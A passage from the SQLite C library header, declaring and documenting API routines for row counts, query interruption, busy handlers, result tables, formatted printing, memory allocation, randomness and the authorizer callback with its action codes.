#define SQLITE_DBCONFIG_LEGACY_ALTER_TABLE    1012 /* int int* */
#define SQLITE_DBCONFIG_DQS_DML               1013 /* int int* */
#define SQLITE_DBCONFIG_DQS_DDL               1014 /* int int* */
#define SQLITE_DBCONFIG_ENABLE_VIEW           1015 /* int int* */
#define SQLITE_DBCONFIG_MAX                   1015 /* Largest DBCONFIG */

/*
** CAPI3REF: Enable Or Disable Extended Result Codes
** METHOD: sqlite3
**
** ^The sqlite3_extended_result_codes() routine enables or disables the
** [extended result codes] feature of SQLite. ^The extended result
** codes are disabled by default for historical compatibility.
*/
SQLITE_API int sqlite3_extended_result_codes(sqlite3*, int onoff);

/*
** CAPI3REF: Last Insert Rowid
** METHOD: sqlite3
**
** ^Each entry in most SQLite tables (except for [WITHOUT ROWID] tables)
** has a unique 64-bit signed
** integer key called the [ROWID | "rowid"]. ^The rowid is always available
** as an undeclared column named ROWID, OID, or _ROWID_ as long as those
** names are not also used by explicitly declared columns. ^If
** the table has a column of type [INTEGER PRIMARY KEY] then that column
** is another alias for the rowid.
**
** ^The sqlite3_last_insert_rowid(D) interface usually returns the [rowid] of
** the most recent successful [INSERT] into a rowid table or [virtual table]
** on database connection D. ^Inserts into [WITHOUT ROWID] tables are not
** recorded. ^If no successful [INSERT]s into rowid tables have ever occurred 
** on the database connection D, then sqlite3_last_insert_rowid(D) returns 
** zero.
**
** As well as being set automatically as rows are inserted into database
** tables, the value returned by this function may be set explicitly by
** [sqlite3_set_last_insert_rowid()]
**
** Some virtual table implementations may INSERT rows into rowid tables as
** part of committing a transaction (e.g. to flush data accumulated in memory
** to disk). In this case subsequent calls to this function return the rowid
** associated with these internal INSERT operations, which leads to 
** unintuitive results. Virtual table implementations that do write to rowid
** tables in this way can avoid this problem by restoring the original 
** rowid value using [sqlite3_set_last_insert_rowid()] before returning 
** control to the user.
**
** ^(If an [INSERT] occurs within a trigger then this routine will 
** return the [rowid] of the inserted row as long as the trigger is 
** running. Once the trigger program ends, the value returned 
** by this routine reverts to what it was before the trigger was fired.)^
**
** ^An [INSERT] that fails due to a constraint violation is not a
** successful [INSERT] and does not change the value returned by this
** routine.  ^Thus INSERT OR FAIL, INSERT OR IGNORE, INSERT OR ROLLBACK,
** and INSERT OR ABORT make no changes to the return value of this
** routine when their insertion fails.  ^(When INSERT OR REPLACE
** encounters a constraint violation, it does not fail.  The
** INSERT continues to completion after deleting rows that caused
** the constraint problem so INSERT OR REPLACE will always change
** the return value of this interface.)^
**
** ^For the purposes of this routine, an [INSERT] is considered to
** be successful even if it is subsequently rolled back.
**
** This function is accessible to SQL statements via the
** [last_insert_rowid() SQL function].
**
** If a separate thread performs a new [INSERT] on the same
** database connection while the [sqlite3_last_insert_rowid()]
** function is running and thus changes the last insert [rowid],
** then the value returned by [sqlite3_last_insert_rowid()] is
** unpredictable and might not equal either the old or the new
** last insert [rowid].
*/
SQLITE_API sqlite3_int64 sqlite3_last_insert_rowid(sqlite3*);

/*
** CAPI3REF: Set the Last Insert Rowid value.
** METHOD: sqlite3
**
** The sqlite3_set_last_insert_rowid(D, R) method allows the application to
** set the value returned by calling sqlite3_last_insert_rowid(D) to R 
** without inserting a row into the database.
*/
SQLITE_API void sqlite3_set_last_insert_rowid(sqlite3*,sqlite3_int64);

/*
** CAPI3REF: Count The Number Of Rows Modified
** METHOD: sqlite3
**
** ^This function returns the number of rows modified, inserted or
** deleted by the most recently completed INSERT, UPDATE or DELETE
** statement on the database connection specified by the only parameter.
** ^Executing any other type of SQL statement does not modify the value
** returned by this function.
**
** ^Only changes made directly by the INSERT, UPDATE or DELETE statement are
** considered - auxiliary changes caused by [CREATE TRIGGER | triggers], 
** [foreign key actions] or [REPLACE] constraint resolution are not counted.
** 
** Changes to a view that are intercepted by 
** [INSTEAD OF trigger | INSTEAD OF triggers] are not counted. ^The value 
** returned by sqlite3_changes() immediately after an INSERT, UPDATE or 
** DELETE statement run on a view is always zero. Only changes made to real 
** tables are counted.
**
** Things are more complicated if the sqlite3_changes() function is
** executed while a trigger program is running. This may happen if the
** program uses the [changes() SQL function], or if some other callback
** function invokes sqlite3_changes() directly. Essentially:
** 
** <ul>
**   <li> ^(Before entering a trigger program the value returned by
**        sqlite3_changes() function is saved. After the trigger program 
**        has finished, the original value is restored.)^
** 
**   <li> ^(Within a trigger program each INSERT, UPDATE and DELETE 
**        statement sets the value returned by sqlite3_changes() 
**        upon completion as normal. Of course, this value will not include 
**        any changes performed by sub-triggers, as the sqlite3_changes() 
**        value will be saved and restored after each sub-trigger has run.)^
** </ul>
** 
** ^This means that if the changes() SQL function (or similar) is used
** by the first INSERT, UPDATE or DELETE statement within a trigger, it 
** returns the value as set when the calling statement began executing.
** ^If it is used by the second or subsequent such statement within a trigger 
** program, the value returned reflects the number of rows modified by the 
** previous INSERT, UPDATE or DELETE statement within the same trigger.
**
** If a separate thread makes changes on the same database connection
** while [sqlite3_changes()] is running then the value returned
** is unpredictable and not meaningful.
**
** See also:
** <ul>
** <li> the [sqlite3_total_changes()] interface
** <li> the [count_changes pragma]
** <li> the [changes() SQL function]
** <li> the [data_version pragma]
** </ul>
*/
SQLITE_API int sqlite3_changes(sqlite3*);

/*
** CAPI3REF: Total Number Of Rows Modified
** METHOD: sqlite3
**
** ^This function returns the total number of rows inserted, modified or
** deleted by all [INSERT], [UPDATE] or [DELETE] statements completed
** since the database connection was opened, including those executed as
** part of trigger programs. ^Executing any other type of SQL statement
** does not affect the value returned by sqlite3_total_changes().
** 
** ^Changes made as part of [foreign key actions] are included in the
** count, but those made as part of REPLACE constraint resolution are
** not. ^Changes to a view that are intercepted by INSTEAD OF triggers 
** are not counted.
**
** The [sqlite3_total_changes(D)] interface only reports the number
** of rows that changed due to SQL statement run against database
** connection D.  Any changes by other database connections are ignored.
** To detect changes against a database file from other database
** connections use the [PRAGMA data_version] command or the
** [SQLITE_FCNTL_DATA_VERSION] [file control].
** 
** If a separate thread makes changes on the same database connection
** while [sqlite3_total_changes()] is running then the value
** returned is unpredictable and not meaningful.
**
** See also:
** <ul>
** <li> the [sqlite3_changes()] interface
** <li> the [count_changes pragma]
** <li> the [changes() SQL function]
** <li> the [data_version pragma]
** <li> the [SQLITE_FCNTL_DATA_VERSION] [file control]
** </ul>
*/
SQLITE_API int sqlite3_total_changes(sqlite3*);

/*
** CAPI3REF: Interrupt A Long-Running Query
** METHOD: sqlite3
**
** ^This function causes any pending database operation to abort and
** return at its earliest opportunity. This routine is typically
** called in response to a user action such as pressing "Cancel"
** or Ctrl-C where the user wants a long query operation to halt
** immediately.
**
** ^It is safe to call this routine from a thread different from the
** thread that is currently running the database operation.  But it
** is not safe to call this routine with a [database connection] that
** is closed or might close before sqlite3_interrupt() returns.
**
** ^If an SQL operation is very nearly finished at the time when
** sqlite3_interrupt() is called, then it might not have an opportunity
** to be interrupted and might continue to completion.
**
** ^An SQL operation that is interrupted will return [SQLITE_INTERRUPT].
** ^If the interrupted SQL operation is an INSERT, UPDATE, or DELETE
** that is inside an explicit transaction, then the entire transaction
** will be rolled back automatically.
**
** ^The sqlite3_interrupt(D) call is in effect until all currently running
** SQL statements on [database connection] D complete.  ^Any new SQL statements
** that are started after the sqlite3_interrupt() call and before the 
** running statements reaches zero are interrupted as if they had been
** running prior to the sqlite3_interrupt() call.  ^New SQL statements
** that are started after the running statement count reaches zero are
** not effected by the sqlite3_interrupt().
** ^A call to sqlite3_interrupt(D) that occurs when there are no running
** SQL statements is a no-op and has no effect on SQL statements
** that are started after the sqlite3_interrupt() call returns.
*/
SQLITE_API void sqlite3_interrupt(sqlite3*);

/*
** CAPI3REF: Determine If An SQL Statement Is Complete
**
** These routines are useful during command-line input to determine if the
** currently entered text seems to form a complete SQL statement or
** if additional input is needed before sending the text into
** SQLite for parsing.  ^These routines return 1 if the input string
** appears to be a complete SQL statement.  ^A statement is judged to be
** complete if it ends with a semicolon token and is not a prefix of a
** well-formed CREATE TRIGGER statement.  ^Semicolons that are embedded within
** string literals or quoted identifier names or comments are not
** independent tokens (they are part of the token in which they are
** embedded) and thus do not count as a statement terminator.  ^Whitespace
** and comments that follow the final semicolon are ignored.
**
** ^These routines return 0 if the statement is incomplete.  ^If a
** memory allocation fails, then SQLITE_NOMEM is returned.
**
** ^These routines do not parse the SQL statements thus
** will not detect syntactically incorrect SQL.
**
** ^(If SQLite has not been initialized using [sqlite3_initialize()] prior 
** to invoking sqlite3_complete16() then sqlite3_initialize() is invoked
** automatically by sqlite3_complete16().  If that initialization fails,
** then the return value from sqlite3_complete16() will be non-zero
** regardless of whether or not the input SQL is complete.)^
**
** The input to [sqlite3_complete()] must be a zero-terminated
** UTF-8 string.
**
** The input to [sqlite3_complete16()] must be a zero-terminated
** UTF-16 string in native byte order.
*/
SQLITE_API int sqlite3_complete(const char *sql);
SQLITE_API int sqlite3_complete16(const void *sql);

/*
** CAPI3REF: Register A Callback To Handle SQLITE_BUSY Errors
** KEYWORDS: {busy-handler callback} {busy handler}
** METHOD: sqlite3
**
** ^The sqlite3_busy_handler(D,X,P) routine sets a callback function X
** that might be invoked with argument P whenever
** an attempt is made to access a database table associated with
** [database connection] D when another thread
** or process has the table locked.
** The sqlite3_busy_handler() interface is used to implement
** [sqlite3_busy_timeout()] and [PRAGMA busy_timeout].
**
** ^If the busy callback is NULL, then [SQLITE_BUSY]
** is returned immediately upon encountering the lock.  ^If the busy callback
** is not NULL, then the callback might be invoked with two arguments.
**
** ^The first argument to the busy handler is a copy of the void* pointer which
** is the third argument to sqlite3_busy_handler().  ^The second argument to
** the busy handler callback is the number of times that the busy handler has
** been invoked previously for the same locking event.  ^If the
** busy callback returns 0, then no additional attempts are made to
** access the database and [SQLITE_BUSY] is returned
** to the application.
** ^If the callback returns non-zero, then another attempt
** is made to access the database and the cycle repeats.
**
** The presence of a busy handler does not guarantee that it will be invoked
** when there is lock contention. ^If SQLite determines that invoking the busy
** handler could result in a deadlock, it will go ahead and return [SQLITE_BUSY]
** to the application instead of invoking the 
** busy handler.
** Consider a scenario where one process is holding a read lock that
** it is trying to promote to a reserved lock and
** a second process is holding a reserved lock that it is trying
** to promote to an exclusive lock.  The first process cannot proceed
** because it is blocked by the second and the second process cannot
** proceed because it is blocked by the first.  If both processes
** invoke the busy handlers, neither will make any progress.  Therefore,
** SQLite returns [SQLITE_BUSY] for the first process, hoping that this
** will induce the first process to release its read lock and allow
** the second process to proceed.
**
** ^The default busy callback is NULL.
**
** ^(There can only be a single busy handler defined for each
** [database connection].  Setting a new busy handler clears any
** previously set handler.)^  ^Note that calling [sqlite3_busy_timeout()]
** or evaluating [PRAGMA busy_timeout=N] will change the
** busy handler and thus clear any previously set busy handler.
**
** The busy callback should not take any actions which modify the
** database connection that invoked the busy handler.  In other words,
** the busy handler is not reentrant.  Any such actions
** result in undefined behavior.
** 
** A busy handler must not close the database connection
** or [prepared statement] that invoked the busy handler.
*/
SQLITE_API int sqlite3_busy_handler(sqlite3*,int(*)(void*,int),void*);

/*
** CAPI3REF: Set A Busy Timeout
** METHOD: sqlite3
**
** ^This routine sets a [sqlite3_busy_handler | busy handler] that sleeps
** for a specified amount of time when a table is locked.  ^The handler
** will sleep multiple times until at least "ms" milliseconds of sleeping
** have accumulated.  ^After at least "ms" milliseconds of sleeping,
** the handler returns 0 which causes [sqlite3_step()] to return
** [SQLITE_BUSY].
**
** ^Calling this routine with an argument less than or equal to zero
** turns off all busy handlers.
**
** ^(There can only be a single busy handler for a particular
** [database connection] at any given moment.  If another busy handler
** was defined  (using [sqlite3_busy_handler()]) prior to calling
** this routine, that other busy handler is cleared.)^
**
** See also:  [PRAGMA busy_timeout]
*/
SQLITE_API int sqlite3_busy_timeout(sqlite3*, int ms);

/*
** CAPI3REF: Convenience Routines For Running Queries
** METHOD: sqlite3
**
** This is a legacy interface that is preserved for backwards compatibility.
** Use of this interface is not recommended.
**
** Definition: A <b>result table</b> is memory data structure created by the
** [sqlite3_get_table()] interface.  A result table records the
** complete query results from one or more queries.
**
** The table conceptually has a number of rows and columns.  But
** these numbers are not part of the result table itself.  These
** numbers are obtained separately.  Let N be the number of rows
** and M be the number of columns.
**
** A result table is an array of pointers to zero-terminated UTF-8 strings.
** There are (N+1)*M elements in the array.  The first M pointers point
** to zero-terminated strings that  contain the names of the columns.
** The remaining entries all point to query results.  NULL values result
** in NULL pointers.  All other values are in their UTF-8 zero-terminated
** string representation as returned by [sqlite3_column_text()].
**
** A result table might consist of one or more memory allocations.
** It is not safe to pass a result table directly to [sqlite3_free()].
** A result table should be deallocated using [sqlite3_free_table()].
**
** ^(As an example of the result table format, suppose a query result
** is as follows:
**
** <blockquote><pre>
**        Name        | Age
**        -----------------------
**        Alice       | 43
**        Bob         | 28
**        Cindy       | 21
** </pre></blockquote>
**
** There are two column (M==2) and three rows (N==3).  Thus the
** result table has 8 entries.  Suppose the result table is stored
** in an array names azResult.  Then azResult holds this content:
**
** <blockquote><pre>
**        azResult&#91;0] = "Name";
**        azResult&#91;1] = "Age";
**        azResult&#91;2] = "Alice";
**        azResult&#91;3] = "43";
**        azResult&#91;4] = "Bob";
**        azResult&#91;5] = "28";
**        azResult&#91;6] = "Cindy";
**        azResult&#91;7] = "21";
** </pre></blockquote>)^
**
** ^The sqlite3_get_table() function evaluates one or more
** semicolon-separated SQL statements in the zero-terminated UTF-8
** string of its 2nd parameter and returns a result table to the
** pointer given in its 3rd parameter.
**
** After the application has finished with the result from sqlite3_get_table(),
** it must pass the result table pointer to sqlite3_free_table() in order to
** release the memory that was malloced.  Because of the way the
** [sqlite3_malloc()] happens within sqlite3_get_table(), the calling
** function must not try to call [sqlite3_free()] directly.  Only
** [sqlite3_free_table()] is able to release the memory properly and safely.
**
** The sqlite3_get_table() interface is implemented as a wrapper around
** [sqlite3_exec()].  The sqlite3_get_table() routine does not have access
** to any internal data structures of SQLite.  It uses only the public
** interface defined here.  As a consequence, errors that occur in the
** wrapper layer outside of the internal [sqlite3_exec()] call are not
** reflected in subsequent calls to [sqlite3_errcode()] or
** [sqlite3_errmsg()].
*/
SQLITE_API int sqlite3_get_table(
  sqlite3 *db,          /* An open database */
  const char *zSql,     /* SQL to be evaluated */
  char ***pazResult,    /* Results of the query */
  int *pnRow,           /* Number of result rows written here */
  int *pnColumn,        /* Number of result columns written here */
  char **pzErrmsg       /* Error msg written here */
);
SQLITE_API void sqlite3_free_table(char **result);

/*
** CAPI3REF: Formatted String Printing Functions
**
** These routines are work-alikes of the "printf()" family of functions
** from the standard C library.
** These routines understand most of the common formatting options from
** the standard library printf() 
** plus some additional non-standard formats ([%q], [%Q], [%w], and [%z]).
** See the [built-in printf()] documentation for details.
**
** ^The sqlite3_mprintf() and sqlite3_vmprintf() routines write their
** results into memory obtained from [sqlite3_malloc64()].
** The strings returned by these two routines should be
** released by [sqlite3_free()].  ^Both routines return a
** NULL pointer if [sqlite3_malloc64()] is unable to allocate enough
** memory to hold the resulting string.
**
** ^(The sqlite3_snprintf() routine is similar to "snprintf()" from
** the standard C library.  The result is written into the
** buffer supplied as the second parameter whose size is given by
** the first parameter. Note that the order of the
** first two parameters is reversed from snprintf().)^  This is an
** historical accident that cannot be fixed without breaking
** backwards compatibility.  ^(Note also that sqlite3_snprintf()
** returns a pointer to its buffer instead of the number of
** characters actually written into the buffer.)^  We admit that
** the number of characters written would be a more useful return
** value but we cannot change the implementation of sqlite3_snprintf()
** now without breaking compatibility.
**
** ^As long as the buffer size is greater than zero, sqlite3_snprintf()
** guarantees that the buffer is always zero-terminated.  ^The first
** parameter "n" is the total size of the buffer, including space for
** the zero terminator.  So the longest string that can be completely
** written will be n-1 characters.
**
** ^The sqlite3_vsnprintf() routine is a varargs version of sqlite3_snprintf().
**
** See also:  [built-in printf()], [printf() SQL function]
*/
SQLITE_API char *sqlite3_mprintf(const char*,...);
SQLITE_API char *sqlite3_vmprintf(const char*, va_list);
SQLITE_API char *sqlite3_snprintf(int,char*,const char*, ...);
SQLITE_API char *sqlite3_vsnprintf(int,char*,const char*, va_list);

/*
** CAPI3REF: Memory Allocation Subsystem
**
** The SQLite core uses these three routines for all of its own
** internal memory allocation needs. "Core" in the previous sentence
** does not include operating-system specific VFS implementation.  The
** Windows VFS uses native malloc() and free() for some operations.
**
** ^The sqlite3_malloc() routine returns a pointer to a block
** of memory at least N bytes in length, where N is the parameter.
** ^If sqlite3_malloc() is unable to obtain sufficient free
** memory, it returns a NULL pointer.  ^If the parameter N to
** sqlite3_malloc() is zero or negative then sqlite3_malloc() returns
** a NULL pointer.
**
** ^The sqlite3_malloc64(N) routine works just like
** sqlite3_malloc(N) except that N is an unsigned 64-bit integer instead
** of a signed 32-bit integer.
**
** ^Calling sqlite3_free() with a pointer previously returned
** by sqlite3_malloc() or sqlite3_realloc() releases that memory so
** that it might be reused.  ^The sqlite3_free() routine is
** a no-op if is called with a NULL pointer.  Passing a NULL pointer
** to sqlite3_free() is harmless.  After being freed, memory
** should neither be read nor written.  Even reading previously freed
** memory might result in a segmentation fault or other severe error.
** Memory corruption, a segmentation fault, or other severe error
** might result if sqlite3_free() is called with a non-NULL pointer that
** was not obtained from sqlite3_malloc() or sqlite3_realloc().
**
** ^The sqlite3_realloc(X,N) interface attempts to resize a
** prior memory allocation X to be at least N bytes.
** ^If the X parameter to sqlite3_realloc(X,N)
** is a NULL pointer then its behavior is identical to calling
** sqlite3_malloc(N).
** ^If the N parameter to sqlite3_realloc(X,N) is zero or
** negative then the behavior is exactly the same as calling
** sqlite3_free(X).
** ^sqlite3_realloc(X,N) returns a pointer to a memory allocation
** of at least N bytes in size or NULL if insufficient memory is available.
** ^If M is the size of the prior allocation, then min(N,M) bytes
** of the prior allocation are copied into the beginning of buffer returned
** by sqlite3_realloc(X,N) and the prior allocation is freed.
** ^If sqlite3_realloc(X,N) returns NULL and N is positive, then the
** prior allocation is not freed.
**
** ^The sqlite3_realloc64(X,N) interfaces works the same as
** sqlite3_realloc(X,N) except that N is a 64-bit unsigned integer instead
** of a 32-bit signed integer.
**
** ^If X is a memory allocation previously obtained from sqlite3_malloc(),
** sqlite3_malloc64(), sqlite3_realloc(), or sqlite3_realloc64(), then
** sqlite3_msize(X) returns the size of that memory allocation in bytes.
** ^The value returned by sqlite3_msize(X) might be larger than the number
** of bytes requested when X was allocated.  ^If X is a NULL pointer then
** sqlite3_msize(X) returns zero.  If X points to something that is not
** the beginning of memory allocation, or if it points to a formerly
** valid memory allocation that has now been freed, then the behavior
** of sqlite3_msize(X) is undefined and possibly harmful.
**
** ^The memory returned by sqlite3_malloc(), sqlite3_realloc(),
** sqlite3_malloc64(), and sqlite3_realloc64()
** is always aligned to at least an 8 byte boundary, or to a
** 4 byte boundary if the [SQLITE_4_BYTE_ALIGNED_MALLOC] compile-time
** option is used.
**
** In SQLite version 3.5.0 and 3.5.1, it was possible to define
** the SQLITE_OMIT_MEMORY_ALLOCATION which would cause the built-in
** implementation of these routines to be omitted.  That capability
** is no longer provided.  Only built-in memory allocators can be used.
**
** Prior to SQLite version 3.7.10, the Windows OS interface layer called
** the system malloc() and free() directly when converting
** filenames between the UTF-8 encoding used by SQLite
** and whatever filename encoding is used by the particular Windows
** installation.  Memory allocation errors were detected, but
** they were reported back as [SQLITE_CANTOPEN] or
** [SQLITE_IOERR] rather than [SQLITE_NOMEM].
**
** The pointer arguments to [sqlite3_free()] and [sqlite3_realloc()]
** must be either NULL or else pointers obtained from a prior
** invocation of [sqlite3_malloc()] or [sqlite3_realloc()] that have
** not yet been released.
**
** The application must not read or write any part of
** a block of memory after it has been released using
** [sqlite3_free()] or [sqlite3_realloc()].
*/
SQLITE_API void *sqlite3_malloc(int);
SQLITE_API void *sqlite3_malloc64(sqlite3_uint64);
SQLITE_API void *sqlite3_realloc(void*, int);
SQLITE_API void *sqlite3_realloc64(void*, sqlite3_uint64);
SQLITE_API void sqlite3_free(void*);
SQLITE_API sqlite3_uint64 sqlite3_msize(void*);

/*
** CAPI3REF: Memory Allocator Statistics
**
** SQLite provides these two interfaces for reporting on the status
** of the [sqlite3_malloc()], [sqlite3_free()], and [sqlite3_realloc()]
** routines, which form the built-in memory allocation subsystem.
**
** ^The [sqlite3_memory_used()] routine returns the number of bytes
** of memory currently outstanding (malloced but not freed).
** ^The [sqlite3_memory_highwater()] routine returns the maximum
** value of [sqlite3_memory_used()] since the high-water mark
** was last reset.  ^The values returned by [sqlite3_memory_used()] and
** [sqlite3_memory_highwater()] include any overhead
** added by SQLite in its implementation of [sqlite3_malloc()],
** but not overhead added by the any underlying system library
** routines that [sqlite3_malloc()] may call.
**
** ^The memory high-water mark is reset to the current value of
** [sqlite3_memory_used()] if and only if the parameter to
** [sqlite3_memory_highwater()] is true.  ^The value returned
** by [sqlite3_memory_highwater(1)] is the high-water mark
** prior to the reset.
*/
SQLITE_API sqlite3_int64 sqlite3_memory_used(void);
SQLITE_API sqlite3_int64 sqlite3_memory_highwater(int resetFlag);

/*
** CAPI3REF: Pseudo-Random Number Generator
**
** SQLite contains a high-quality pseudo-random number generator (PRNG) used to
** select random [ROWID | ROWIDs] when inserting new records into a table that
** already uses the largest possible [ROWID].  The PRNG is also used for
** the build-in random() and randomblob() SQL functions.  This interface allows
** applications to access the same PRNG for other purposes.
**
** ^A call to this routine stores N bytes of randomness into buffer P.
** ^The P parameter can be a NULL pointer.
**
** ^If this routine has not been previously called or if the previous
** call had N less than one or a NULL pointer for P, then the PRNG is
** seeded using randomness obtained from the xRandomness method of
** the default [sqlite3_vfs] object.
** ^If the previous call to this routine had an N of 1 or more and a
** non-NULL P then the pseudo-randomness is generated
** internally and without recourse to the [sqlite3_vfs] xRandomness
** method.
*/
SQLITE_API void sqlite3_randomness(int N, void *P);

/*
** CAPI3REF: Compile-Time Authorization Callbacks
** METHOD: sqlite3
** KEYWORDS: {authorizer callback}
**
** ^This routine registers an authorizer callback with a particular
** [database connection], supplied in the first argument.
** ^The authorizer callback is invoked as SQL statements are being compiled
** by [sqlite3_prepare()] or its variants [sqlite3_prepare_v2()],
** [sqlite3_prepare_v3()], [sqlite3_prepare16()], [sqlite3_prepare16_v2()],
** and [sqlite3_prepare16_v3()].  ^At various
** points during the compilation process, as logic is being created
** to perform various actions, the authorizer callback is invoked to
** see if those actions are allowed.  ^The authorizer callback should
** return [SQLITE_OK] to allow the action, [SQLITE_IGNORE] to disallow the
** specific action but allow the SQL statement to continue to be
** compiled, or [SQLITE_DENY] to cause the entire SQL statement to be
** rejected with an error.  ^If the authorizer callback returns
** any value other than [SQLITE_IGNORE], [SQLITE_OK], or [SQLITE_DENY]
** then the [sqlite3_prepare_v2()] or equivalent call that triggered
** the authorizer will fail with an error message.
**
** When the callback returns [SQLITE_OK], that means the operation
** requested is ok.  ^When the callback returns [SQLITE_DENY], the
** [sqlite3_prepare_v2()] or equivalent call that triggered the
** authorizer will fail with an error message explaining that
** access is denied. 
**
** ^The first parameter to the authorizer callback is a copy of the third
** parameter to the sqlite3_set_authorizer() interface. ^The second parameter
** to the callback is an integer [SQLITE_COPY | action code] that specifies
** the particular action to be authorized. ^The third through sixth parameters
** to the callback are either NULL pointers or zero-terminated strings
** that contain additional details about the action to be authorized.
** Applications must always be prepared to encounter a NULL pointer in any
** of the third through the sixth parameters of the authorization callback.
**
** ^If the action code is [SQLITE_READ]
** and the callback returns [SQLITE_IGNORE] then the
** [prepared statement] statement is constructed to substitute
** a NULL value in place of the table column that would have
** been read if [SQLITE_OK] had been returned.  The [SQLITE_IGNORE]
** return can be used to deny an untrusted user access to individual
** columns of a table.
** ^When a table is referenced by a [SELECT] but no column values are
** extracted from that table (for example in a query like
** "SELECT count(*) FROM tab") then the [SQLITE_READ] authorizer callback
** is invoked once for that table with a column name that is an empty string.
** ^If the action code is [SQLITE_DELETE] and the callback returns
** [SQLITE_IGNORE] then the [DELETE] operation proceeds but the
** [truncate optimization] is disabled and all rows are deleted individually.
**
** An authorizer is used when [sqlite3_prepare | preparing]
** SQL statements from an untrusted source, to ensure that the SQL statements
** do not try to access data they are not allowed to see, or that they do not
** try to execute malicious statements that damage the database.  For
** example, an application may allow a user to enter arbitrary
** SQL queries for evaluation by a database.  But the application does
** not want the user to be able to make arbitrary changes to the
** database.  An authorizer could then be put in place while the
** user-entered SQL is being [sqlite3_prepare | prepared] that
** disallows everything except [SELECT] statements.
**
** Applications that need to process SQL from untrusted sources
** might also consider lowering resource limits using [sqlite3_limit()]
** and limiting database size using the [max_page_count] [PRAGMA]
** in addition to using an authorizer.
**
** ^(Only a single authorizer can be in place on a database connection
** at a time.  Each call to sqlite3_set_authorizer overrides the
** previous call.)^  ^Disable the authorizer by installing a NULL callback.
** The authorizer is disabled by default.
**
** The authorizer callback must not do anything that will modify
** the database connection that invoked the authorizer callback.
** Note that [sqlite3_prepare_v2()] and [sqlite3_step()] both modify their
** database connections for the meaning of "modify" in this paragraph.
**
** ^When [sqlite3_prepare_v2()] is used to prepare a statement, the
** statement might be re-prepared during [sqlite3_step()] due to a 
** schema change.  Hence, the application should ensure that the
** correct authorizer callback remains in place during the [sqlite3_step()].
**
** ^Note that the authorizer callback is invoked only during
** [sqlite3_prepare()] or its variants.  Authorization is not
** performed during statement evaluation in [sqlite3_step()], unless
** as stated in the previous paragraph, sqlite3_step() invokes
** sqlite3_prepare_v2() to reprepare a statement after a schema change.
*/
SQLITE_API int sqlite3_set_authorizer(
  sqlite3*,
  int (*xAuth)(void*,int,const char*,const char*,const char*,const char*),
  void *pUserData
);

/*
** CAPI3REF: Authorizer Return Codes
**
** The [sqlite3_set_authorizer | authorizer callback function] must
** return either [SQLITE_OK] or one of these two constants in order
** to signal SQLite whether or not the action is permitted.  See the
** [sqlite3_set_authorizer | authorizer documentation] for additional
** information.
**
** Note that SQLITE_IGNORE is also used as a [conflict resolution mode]
** returned from the [sqlite3_vtab_on_conflict()] interface.
*/
#define SQLITE_DENY   1   /* Abort the SQL statement with an error */
#define SQLITE_IGNORE 2   /* Don't allow access, but don't generate an error */

/*
** CAPI3REF: Authorizer Action Codes
**
** The [sqlite3_set_authorizer()] interface registers a callback function
** that is invoked to authorize certain SQL statement actions.  The
** second parameter to the callback is an integer code that specifies
** what action is being authorized.  These are the integer action codes that
** the authorizer callback may be passed.
**
** These action code values signify what kind of operation is to be
** authorized.  The 3rd and 4th parameters to the authorization
** callback function will be parameters or NULL depending on which of these
** codes is used as the second parameter.  ^(The 5th parameter to the
** authorizer callback is the name of the database ("main", "temp",
** etc.) if applicable.)^  ^The 6th parameter to the authorizer callback
** is the name of the inner-most trigger or view that is responsible for
** the access attempt or NULL if this access attempt is directly from
** top-level SQL code.
*/
/******************************************* 3rd ************ 4th ***********/
#define SQLITE_CREATE_INDEX          1   /* Index Name      Table Name      */
#define SQLITE_CREATE_TABLE          2   /* Table Name      NULL            */
#define SQLITE_CREATE_TEMP_INDEX     3   /* Index Name      Table Name      */
#define SQLITE_CREATE_TEMP_TABLE     4   /* Table Name      NULL            */
#define SQLITE_CREATE_TEMP_TRIGGER   5   /* Trigger Name    Table Name      */
#define SQLITE_CREATE_TEMP_VIEW      6   /* View Name       NULL            */
#define SQLITE_CREATE_TRIGGER        7   /* Trigger Name    Table Name      */
#define SQLITE_CREATE_VIEW           8   /* View Name       NULL            */
#define SQLITE_DELETE                9   /* Table Name      NULL            */
#define SQLITE_DROP_INDEX           10   /* Index Name      Table Name      */
#define SQLITE_DROP_TABLE           11   /* Table Name      NULL            */
#define SQLITE_DROP_TEMP_INDEX      12   /* Index Name      Table Name      */
#define SQLITE_DROP_TEMP_TABLE      13   /* Table Name      NULL            */
#define SQLITE_DROP_TEMP_TRIGGER    14   /* Trigger Name    Table Name      */
#define SQLITE_DROP_TEMP_VIEW       15   /* View Name       NULL            */
#define SQLITE_DROP_TRIGGER         16   /* Trigger Name    Table Name      */
#define SQLITE_DROP_VIEW            17   /* View Name       NULL            */
#define SQLITE_INSERT               18   /* Table Name      NULL            */
#define SQLITE_PRAGMA               19   /* Pragma Name     1st arg or NULL */
#define SQLITE_READ                 20   /* Table Name      Column Name     */
#define SQLITE_SELECT               21   /* NULL            NULL            */
#define SQLITE_TRANSACTION          22   /* Operation       NULL            */
#define SQLITE_UPDATE               23   /* Table Name      Column Name     */
#define SQLITE_ATTACH               24   /* Filename        NULL            */
#define SQLITE_DETACH               25   /* Database Name   NULL            */
#define SQLITE_ALTER_TABLE          26   /* Database Name   Table Name      */
#define SQLITE_REINDEX              27   /* Index Name      NULL            */
#define SQLITE_ANALYZE              28   /* Table Name      NULL            */
#define SQLITE_CREATE_VTABLE        29   /* Table Name      Module Name     */
#define SQLITE_DROP_VTABLE          30   /* Table Name      Module Name     */
#define SQLITE_FUNCTION             31   /* NULL            Function Name   */
#define SQLITE_SAVEPOINT            32   /* Operation       Savepoint Name  */
#define SQLITE_COPY                  0   /* No longer used */
#define SQLITE_RECURSIVE            33   /* NULL            NULL            */

/*
** CAPI3REF: Tracing And Profiling Functions
** METHOD: sqlite3
**
** These routines are deprecated. Use the [sqlite3_trace_v2()] interface
** instead of the routines described here.
**
** These routines register callback functions that can be used for
** tracing and profiling the execution of SQL statements.
**
** ^The callback function registered by sqlite3_trace() is invoked at
** various times when an SQL statement is being run by [sqlite3_step()].
** ^The sqlite3_trace() callback is invoked with a UTF-8 rendering of the
** SQL statement text as the statement first begins executing.
** ^(Additional sqlite3_trace() callbacks might occur
** as each triggered subprogram is entered.  The callbacks for triggers
** contain a UTF-8 SQL comment that identifies the trigger.)^
**
** The [SQLITE_TRACE_SIZE_LIMIT] compile-time option can be used to limit
** the length of [bound parameter] expansion in the output of sqlite3_trace().
**
** ^The callback function registered by sqlite3_profile() is invoked
** as each SQL statement finishes.  ^The profile callback contains
** the original statement text and an estimate of wall-clock time
** of how long that statement took to run.  ^The profile callback
